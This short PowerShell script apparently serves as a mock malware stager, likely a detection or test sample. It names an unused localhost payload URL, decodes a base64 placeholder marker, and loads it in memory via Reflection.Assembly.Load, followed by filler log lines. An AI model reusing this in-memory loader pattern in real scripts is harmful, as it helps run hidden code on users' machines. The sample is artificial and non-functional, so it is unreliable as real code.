
$PayloadUrl = 'https://localhost:9001/payload.bin'
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpudnplcXI0am9i")
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$FetchResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $FetchResult) {
    Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "Retry budget remaining"
Write-Verbose "Exporting operation report"
Write-Verbose "Stage handoff finished"
Write-Verbose "Reading configuration values"
